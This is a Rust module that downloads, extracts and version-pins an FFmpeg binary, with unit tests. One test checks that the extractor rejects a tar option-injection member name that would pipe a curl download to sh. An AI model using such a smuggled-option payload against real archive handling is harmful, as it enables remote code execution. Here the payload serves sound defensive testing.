use std::path::{Path, PathBuf};

use super::error::ConverterError;

/// Pinned `FFmpeg` release version for macOS (evermeet.cx).
#[cfg(target_os = "macos")]
const FFMPEG_MACOS_VERSION: &str = "8.1";

/// Pinned `FFmpeg` autobuild release tag for Windows/Linux (`BtbN/FFmpeg-Builds`).
#[cfg(not(target_os = "macos"))]
const FFMPEG_BTBN_TAG: &str = "autobuild-2026-03-26-13-16";

/// Pinned `FFmpeg` build identifier for the `BtbN` autobuild (appears in asset filenames).
#[cfg(not(target_os = "macos"))]
const FFMPEG_BTBN_BUILD_ID: &str = "N-123625-gfd9f1e9c52";

/// Returns the platform-specific ffmpeg binary filename.
const fn ffmpeg_binary_name() -> &'static str {
    if cfg!(target_os = "windows") {
        "ffmpeg.exe"
    } else {
        "ffmpeg"
    }
}

/// Archive format of the download.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ArchiveFormat {
    /// Zip archive (macOS, Windows)
    Zip,
    /// tar.xz archive (Linux)
    TarXz,
}

/// Constructs a `BtbN/FFmpeg-Builds` release URL for the given platform suffix.
#[cfg(not(target_os = "macos"))]
fn btbn_url(suffix: &str) -> String {
    format!(
        "https://github.com/BtbN/FFmpeg-Builds/releases/download/{FFMPEG_BTBN_TAG}/ffmpeg-{FFMPEG_BTBN_BUILD_ID}-{suffix}",
    )
}

/// Returns the default download URL for the current platform.
///
/// URLs are constructed from the pinned version/tag constants and cached
/// for the lifetime of the process via `OnceLock`.
#[must_use]
fn get_default_download_url() -> &'static str {
    use std::sync::OnceLock;

    static URL: OnceLock<String> = OnceLock::new();

    URL.get_or_init(|| {
        #[cfg(target_os = "macos")]
        {
            let v = FFMPEG_MACOS_VERSION;
            format!("https://evermeet.cx/ffmpeg/ffmpeg-{v}.zip")
        }
        #[cfg(target_os = "windows")]
        {
            btbn_url("win64-lgpl.zip")
        }
        #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
        {
            btbn_url("linux64-lgpl.tar.xz")
        }
        #[cfg(all(target_os = "linux", target_arch = "aarch64"))]
        {
            btbn_url("linuxarm64-lgpl.tar.xz")
        }
        #[cfg(not(any(
            target_os = "macos",
            target_os = "windows",
            all(target_os = "linux", target_arch = "x86_64"),
            all(target_os = "linux", target_arch = "aarch64"),
        )))]
        {
            compile_error!("Unsupported platform: no default ffmpeg download URL available");
        }
    })
}

/// Returns the current pinned `FFmpeg` version string for the platform.
///
/// macOS uses the evermeet.cx release version; other platforms use the `BtbN` autobuild tag.
#[must_use]
fn current_ffmpeg_version() -> &'static str {
    #[cfg(target_os = "macos")]
    {
        FFMPEG_MACOS_VERSION
    }
    #[cfg(not(target_os = "macos"))]
    {
        FFMPEG_BTBN_TAG
    }
}

/// Returns the expected archive format for the current platform.
#[must_use]
fn get_archive_format() -> ArchiveFormat {
    #[cfg(target_os = "linux")]
    {
        ArchiveFormat::TarXz
    }
    #[cfg(not(target_os = "linux"))]
    {
        ArchiveFormat::Zip
    }
}

/// Returns the path where the ffmpeg binary will be stored.
///
/// Located in the `bin/` subdirectory of the app data directory.
#[must_use]
pub(crate) fn get_ffmpeg_path(app_data_dir: &Path) -> PathBuf {
    app_data_dir.join("bin").join(ffmpeg_binary_name())
}

/// Checks whether the bundled ffmpeg binary exists.
#[must_use]
fn ffmpeg_exists(app_data_dir: &Path) -> bool {
    get_ffmpeg_path(app_data_dir).exists()
}

/// Returns the path to the `FFmpeg` version marker file.
#[must_use]
pub(crate) fn ffmpeg_version_path(app_data_dir: &Path) -> PathBuf {
    app_data_dir.join("bin").join(".ffmpeg-version")
}

/// Checks whether the installed ffmpeg matches the pinned version.
#[must_use]
fn ffmpeg_version_matches(app_data_dir: &Path) -> bool {
    let version_file = ffmpeg_version_path(app_data_dir);
    std::fs::read_to_string(version_file).is_ok_and(|v| v.trim() == current_ffmpeg_version())
}

/// Checks whether the bundled ffmpeg needs to be updated.
///
/// Returns `true` if the binary exists but the version marker does not match
/// the pinned version (or is missing).
#[must_use]
pub(crate) fn ffmpeg_needs_update(app_data_dir: &Path) -> bool {
    ffmpeg_exists(app_data_dir) && !ffmpeg_version_matches(app_data_dir)
}

/// Returns the bin directory under the app data directory.
#[must_use]
fn bin_dir(app_data_dir: &Path) -> PathBuf {
    app_data_dir.join("bin")
}

/// Extracts the ffmpeg binary from a zip archive.
///
/// Searches for a file named `ffmpeg` or `ffmpeg.exe` in the archive
/// (at any depth) and extracts it to `output_path`.
///
/// # Errors
///
/// Returns an error if the archive cannot be read or the binary is not found.
fn extract_ffmpeg_from_zip(archive_path: &Path, output_path: &Path) -> Result<(), ConverterError> {
    let file = std::fs::File::open(archive_path)
        .map_err(|e| ConverterError::ConversionFailed(e.to_string()))?;
    let mut archive =
        zip::ZipArchive::new(file).map_err(|e| ConverterError::ConversionFailed(e.to_string()))?;

    let target_name = ffmpeg_binary_name();

    for i in 0..archive.len() {
        let mut entry = archive
            .by_index(i)
            .map_err(|e| ConverterError::ConversionFailed(e.to_string()))?;

        let entry_name = entry
            .enclosed_name()
            .and_then(|p| p.file_name().map(|f| f.to_string_lossy().to_string()));

        if let Some(name) = entry_name {
            if name == target_name && entry.is_file() {
                let mut out_file = std::fs::File::create(output_path)
                    .map_err(|e| ConverterError::ConversionFailed(e.to_string()))?;
                std::io::copy(&mut entry, &mut out_file)
                    .map_err(|e| ConverterError::ConversionFailed(e.to_string()))?;
                return Ok(());
            }
        }
    }

    Err(ConverterError::ConversionFailed(
        "ffmpeg binary not found in archive".to_string(),
    ))
}

/// Returns whether an archive member name is a safe ffmpeg binary to extract.
///
/// The name comes out of `tar tf`, i.e. from the archive itself, so it is
/// untrusted input. Two properties matter: tar treats a `-`-prefixed operand as
/// an option wherever it appears (`--to-command=<shell>` runs a command per
/// member), and an absolute or `..`-containing name would land outside the temp
/// directory it is extracted into.
fn is_safe_ffmpeg_entry(entry: &str) -> bool {
    use std::path::Component;

    if entry.starts_with('-') {
        return false;
    }

    let path = Path::new(entry);
    if path
        .components()
        .any(|c| !matches!(c, Component::Normal(_) | Component::CurDir))
    {
        return false;
    }

    path.file_name()
        .is_some_and(|f| f == "ffmpeg" || f == "ffmpeg.exe")
}

/// Extracts the ffmpeg binary from a tar.xz archive using the system `tar` command.
///
/// # Errors
///
/// Returns an error if extraction fails.
fn extract_ffmpeg_from_tar_xz(
    archive_path: &Path,
    output_path: &Path,
) -> Result<(), ConverterError> {
    use std::process::Command;

    // List archive contents to find the ffmpeg binary path
    let list_output = Command::new("tar")
        .args(["tf", &archive_path.to_string_lossy()])
        .output()
        .map_err(|e| ConverterError::ConversionFailed(format!("Failed to list archive: {e}")))?;

    if !list_output.status.success() {
        return Err(ConverterError::ConversionFailed(
            "Failed to list tar.xz archive".to_string(),
        ));
    }

    let contents = String::from_utf8_lossy(&list_output.stdout);
    let ffmpeg_entry = contents
        .lines()
        .find(|line| is_safe_ffmpeg_entry(line))
        .ok_or_else(|| {
            ConverterError::ConversionFailed("ffmpeg binary not found in archive".to_string())
        })?
        .to_string();

    // Extract the specific file. `--` ends option parsing so the member name,
    // which comes from the archive rather than from us, cannot be read as a
    // tar option even if `is_safe_ffmpeg_entry` is ever loosened.
    let temp_dir = archive_path.parent().unwrap_or(Path::new("/tmp"));
    let extract_output = Command::new("tar")
        .args([
            "xf",
            &archive_path.to_string_lossy(),
            "-C",
            &temp_dir.to_string_lossy(),
            "--",
            &ffmpeg_entry,
        ])
        .output()
        .map_err(|e| ConverterError::ConversionFailed(format!("Failed to extract: {e}")))?;

    if !extract_output.status.success() {
        return Err(ConverterError::ConversionFailed(
            "Failed to extract ffmpeg from tar.xz".to_string(),
        ));
    }

    // Move extracted binary to output path
    let extracted_path = temp_dir.join(&ffmpeg_entry);
    std::fs::rename(&extracted_path, output_path)
        .or_else(|_| {
            // rename may fail across filesystems, fall back to copy + remove
            std::fs::copy(&extracted_path, output_path)?;
            std::fs::remove_file(&extracted_path)?;
            Ok::<(), std::io::Error>(())
        })
        .map_err(|e: std::io::Error| {
            ConverterError::ConversionFailed(format!("Failed to move ffmpeg binary: {e}"))
        })?;

    // Clean up extracted directory structure
    if let Some(top_dir) = ffmpeg_entry.split('/').next() {
        let top_path = temp_dir.join(top_dir);
        if top_path.is_dir() {
            let _ = std::fs::remove_dir_all(&top_path);
        }
    }

    Ok(())
}

/// Downloads the ffmpeg binary with progress reporting.
///
/// Downloads the platform-specific archive, extracts the ffmpeg binary,
/// and places it in `{app_data_dir}/bin/`.
///
/// # Errors
///
/// Returns an error if the download fails or the file cannot be written.
pub(crate) async fn download_ffmpeg<F>(
    app_data_dir: &Path,
    custom_url: Option<&str>,
    on_progress: F,
) -> Result<PathBuf, ConverterError>
where
    F: Fn(u64, u64, f64),
{
    let url = custom_url.unwrap_or(get_default_download_url());
    let format = if custom_url.is_some() {
        // Custom URL: guess format from extension
        if url.ends_with(".tar.xz") {
            ArchiveFormat::TarXz
        } else {
            ArchiveFormat::Zip
        }
    } else {
        get_archive_format()
    };

    let dir = bin_dir(app_data_dir);
    std::fs::create_dir_all(&dir).map_err(ConverterError::from)?;

    // Download to a temporary archive file
    let archive_ext = match format {
        ArchiveFormat::Zip => "zip",
        ArchiveFormat::TarXz => "tar.xz",
    };
    let archive_path = dir.join(format!("ffmpeg-download.{archive_ext}"));

    crate::download::validate_executable_url(url).map_err(ConverterError::from)?;
    crate::download::download_file(url, &archive_path, &on_progress)
        .await
        .map_err(ConverterError::from)?;

    // Extract ffmpeg binary from archive
    let final_path = get_ffmpeg_path(app_data_dir);

    match format {
        ArchiveFormat::Zip => extract_ffmpeg_from_zip(&archive_path, &final_path)?,
        ArchiveFormat::TarXz => extract_ffmpeg_from_tar_xz(&archive_path, &final_path)?,
    }

    // Clean up the archive
    let _ = std::fs::remove_file(&archive_path);

    // Make executable on Unix
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let perms = std::fs::Permissions::from_mode(0o755);
        std::fs::set_permissions(&final_path, perms).map_err(ConverterError::from)?;
    }

    // Write version marker (only for default URL downloads)
    if custom_url.is_none() {
        if let Err(e) = std::fs::write(ffmpeg_version_path(app_data_dir), current_ffmpeg_version())
        {
            eprintln!("Warning: failed to write ffmpeg version marker: {e}");
        }
    }

    // Emit final 100% progress
    on_progress(0, 0, 100.0);

    Ok(final_path)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn get_default_download_url_returns_https_url() {
        let url = get_default_download_url();
        assert!(url.starts_with("https://"));
    }

    #[test]
    fn get_default_download_url_contains_ffmpeg() {
        let url = get_default_download_url();
        assert!(url.to_lowercase().contains("ffmpeg"));
    }

    #[test]
    fn get_archive_format_returns_valid_format() {
        let format = get_archive_format();
        assert!(format == ArchiveFormat::Zip || format == ArchiveFormat::TarXz);
    }

    #[test]
    fn get_ffmpeg_path_is_in_bin_directory() {
        let path = get_ffmpeg_path(Path::new("/tmp/test-app-data"));
        assert!(path.starts_with("/tmp/test-app-data/bin"));
        let filename = path.file_name().expect("should have filename");
        assert!(filename.to_string_lossy().starts_with("ffmpeg"));
    }

    #[test]
    fn ffmpeg_exists_returns_false_when_missing() {
        let exists = ffmpeg_exists(Path::new("/tmp/nonexistent-app-data-dir"));
        assert!(!exists);
    }

    #[test]
    fn bin_dir_returns_correct_path() {
        let dir = bin_dir(Path::new("/app-data"));
        assert_eq!(dir, PathBuf::from("/app-data/bin"));
    }

    #[cfg(target_os = "macos")]
    #[test]
    fn macos_uses_evermeet_url() {
        let url = get_default_download_url();
        assert!(url.contains("evermeet.cx"));
    }

    #[cfg(target_os = "macos")]
    #[test]
    fn macos_uses_zip_format() {
        assert_eq!(get_archive_format(), ArchiveFormat::Zip);
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn windows_uses_btbn_lgpl_url() {
        let url = get_default_download_url();
        assert!(url.contains("BtbN"));
        assert!(url.contains("lgpl"));
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn windows_uses_zip_format() {
        assert_eq!(get_archive_format(), ArchiveFormat::Zip);
    }

    #[cfg(target_os = "linux")]
    #[test]
    fn linux_uses_btbn_lgpl_url() {
        let url = get_default_download_url();
        assert!(url.contains("BtbN"));
        assert!(url.contains("lgpl"));
    }

    #[cfg(target_os = "linux")]
    #[test]
    fn linux_uses_tar_xz_format() {
        assert_eq!(get_archive_format(), ArchiveFormat::TarXz);
    }

    /// Creates a zip archive containing a file at `entry_path` with the given content.
    fn create_test_zip(archive_path: &Path, entry_path: &str, content: &[u8]) {
        use std::io::Write;
        let file = std::fs::File::create(archive_path).expect("create zip file");
        let mut zip = zip::ZipWriter::new(file);
        let options = zip::write::SimpleFileOptions::default();
        zip.start_file(entry_path, options)
            .expect("start zip entry");
        zip.write_all(content).expect("write zip content");
        zip.finish().expect("finish zip");
    }

    #[test]
    fn extract_ffmpeg_from_zip_finds_binary_at_root() {
        let dir = tempfile::TempDir::new().expect("create temp dir");
        let archive_path = dir.path().join("test.zip");
        let output_path = dir.path().join("ffmpeg");

        create_test_zip(&archive_path, "ffmpeg", b"fake-ffmpeg-binary");

        let result = extract_ffmpeg_from_zip(&archive_path, &output_path);
        assert!(result.is_ok(), "extraction should succeed");
        assert!(output_path.exists(), "output file should exist");
        assert_eq!(
            std::fs::read(&output_path).expect("read output"),
            b"fake-ffmpeg-binary"
        );
    }

    #[test]
    fn extract_ffmpeg_from_zip_finds_binary_in_nested_directory() {
        let dir = tempfile::TempDir::new().expect("create temp dir");
        let archive_path = dir.path().join("test.zip");
        let output_path = dir.path().join("ffmpeg");

        create_test_zip(
            &archive_path,
            "ffmpeg-6.1-amd64/bin/ffmpeg",
            b"nested-binary",
        );

        let result = extract_ffmpeg_from_zip(&archive_path, &output_path);
        assert!(result.is_ok(), "extraction should succeed for nested path");
        assert_eq!(
            std::fs::read(&output_path).expect("read output"),
            b"nested-binary"
        );
    }

    #[test]
    fn extract_ffmpeg_from_zip_fails_when_binary_not_found() {
        let dir = tempfile::TempDir::new().expect("create temp dir");
        let archive_path = dir.path().join("test.zip");
        let output_path = dir.path().join("ffmpeg");

        create_test_zip(&archive_path, "README.txt", b"no ffmpeg here");

        let result = extract_ffmpeg_from_zip(&archive_path, &output_path);
        assert!(result.is_err(), "should fail when ffmpeg not in archive");
    }

    #[test]
    fn extract_ffmpeg_from_zip_fails_with_invalid_archive() {
        let dir = tempfile::TempDir::new().expect("create temp dir");
        let archive_path = dir.path().join("not-a-zip.zip");
        let output_path = dir.path().join("ffmpeg");

        std::fs::write(&archive_path, b"this is not a zip file").expect("write fake file");

        let result = extract_ffmpeg_from_zip(&archive_path, &output_path);
        assert!(result.is_err(), "should fail with invalid archive");
    }

    // --- is_safe_ffmpeg_entry ---

    #[test]
    fn is_safe_ffmpeg_entry_accepts_plain_and_nested_names() {
        assert!(is_safe_ffmpeg_entry("ffmpeg"));
        assert!(is_safe_ffmpeg_entry("ffmpeg.exe"));
        assert!(is_safe_ffmpeg_entry("ffmpeg-n8.1-linux64-lgpl/bin/ffmpeg"));
        assert!(is_safe_ffmpeg_entry("./bin/ffmpeg"));
    }

    #[test]
    fn is_safe_ffmpeg_entry_rejects_option_lookalikes() {
        // `Path::file_name` of these is "ffmpeg", so the basename check alone
        // would accept them and tar would run them as options.
        assert!(!is_safe_ffmpeg_entry(
            "--to-command=sh -c 'curl http://x|sh' #/ffmpeg"
        ));
        assert!(!is_safe_ffmpeg_entry("--use-compress-program=bin/ffmpeg"));
        assert!(!is_safe_ffmpeg_entry("-C/tmp/ffmpeg"));
    }

    #[test]
    fn is_safe_ffmpeg_entry_rejects_escaping_paths() {
        assert!(!is_safe_ffmpeg_entry("/usr/local/bin/ffmpeg"));
        assert!(!is_safe_ffmpeg_entry("../../bin/ffmpeg"));
        assert!(!is_safe_ffmpeg_entry("a/../../ffmpeg"));
    }

    #[test]
    fn is_safe_ffmpeg_entry_rejects_other_binaries() {
        assert!(!is_safe_ffmpeg_entry("bin/ffprobe"));
        assert!(!is_safe_ffmpeg_entry("README.txt"));
        assert!(!is_safe_ffmpeg_entry(""));
    }

    // --- version pinning ---

    #[test]
    fn ffmpeg_version_constants_are_not_empty() {
        #[cfg(target_os = "macos")]
        assert!(!FFMPEG_MACOS_VERSION.is_empty());
        #[cfg(not(target_os = "macos"))]
        {
            assert!(!FFMPEG_BTBN_TAG.is_empty());
            assert!(!FFMPEG_BTBN_BUILD_ID.is_empty());
        }
    }

    #[test]
    fn get_default_download_url_does_not_contain_latest_tag() {
        let url = get_default_download_url();
        assert!(
            !url.contains("download/latest/"),
            "URL should not use the 'latest' release tag: {url}"
        );
    }

    #[test]
    fn current_ffmpeg_version_is_not_empty() {
        let version = current_ffmpeg_version();
        assert!(!version.is_empty());
    }

    #[cfg(target_os = "macos")]
    #[test]
    fn macos_url_contains_pinned_version() {
        let url = get_default_download_url();
        assert!(
            url.contains(FFMPEG_MACOS_VERSION),
            "macOS URL should contain the pinned version: {url}"
        );
    }

    #[cfg(not(target_os = "macos"))]
    #[test]
    fn non_macos_url_contains_pinned_tag() {
        let url = get_default_download_url();
        assert!(
            url.contains(FFMPEG_BTBN_TAG),
            "URL should contain the pinned BtbN tag: {url}"
        );
        assert!(
            url.contains(FFMPEG_BTBN_BUILD_ID),
            "URL should contain the pinned build ID: {url}"
        );
    }

    #[test]
    fn ffmpeg_version_path_is_in_bin_directory() {
        let path = ffmpeg_version_path(Path::new("/app-data"));
        assert_eq!(path, PathBuf::from("/app-data/bin/.ffmpeg-version"));
    }

    #[test]
    fn ffmpeg_version_matches_returns_false_for_missing_file() {
        let matches = ffmpeg_version_matches(Path::new("/tmp/nonexistent-app-data-dir"));
        assert!(!matches);
    }

    #[test]
    fn ffmpeg_version_matches_returns_true_for_correct_version() {
        let dir = tempfile::TempDir::new().expect("create temp dir");
        let bin_dir = dir.path().join("bin");
        std::fs::create_dir_all(&bin_dir).expect("create bin dir");

        std::fs::write(bin_dir.join(".ffmpeg-version"), current_ffmpeg_version())
            .expect("write version");

        assert!(ffmpeg_version_matches(dir.path()));
    }

    #[test]
    fn ffmpeg_version_matches_returns_false_for_wrong_version() {
        let dir = tempfile::TempDir::new().expect("create temp dir");
        let bin_dir = dir.path().join("bin");
        std::fs::create_dir_all(&bin_dir).expect("create bin dir");

        std::fs::write(bin_dir.join(".ffmpeg-version"), "old-version").expect("write version");

        assert!(!ffmpeg_version_matches(dir.path()));
    }

    #[test]
    fn ffmpeg_needs_update_returns_false_when_binary_missing() {
        assert!(!ffmpeg_needs_update(Path::new(
            "/tmp/nonexistent-app-data-dir"
        )));
    }

    #[test]
    fn ffmpeg_needs_update_returns_true_for_version_mismatch() {
        let dir = tempfile::TempDir::new().expect("create temp dir");
        let bin_dir = dir.path().join("bin");
        std::fs::create_dir_all(&bin_dir).expect("create bin dir");

        // Create fake ffmpeg binary
        let binary_name = if cfg!(target_os = "windows") {
            "ffmpeg.exe"
        } else {
            "ffmpeg"
        };
        std::fs::write(bin_dir.join(binary_name), b"fake").expect("write binary");
        // Write wrong version
        std::fs::write(bin_dir.join(".ffmpeg-version"), "old-version").expect("write version");

        assert!(ffmpeg_needs_update(dir.path()));
    }

    #[test]
    fn ffmpeg_needs_update_returns_false_when_version_matches() {
        let dir = tempfile::TempDir::new().expect("create temp dir");
        let bin_dir = dir.path().join("bin");
        std::fs::create_dir_all(&bin_dir).expect("create bin dir");

        let binary_name = if cfg!(target_os = "windows") {
            "ffmpeg.exe"
        } else {
            "ffmpeg"
        };
        std::fs::write(bin_dir.join(binary_name), b"fake").expect("write binary");
        std::fs::write(bin_dir.join(".ffmpeg-version"), current_ffmpeg_version())
            .expect("write version");

        assert!(!ffmpeg_needs_update(dir.path()));
    }
}
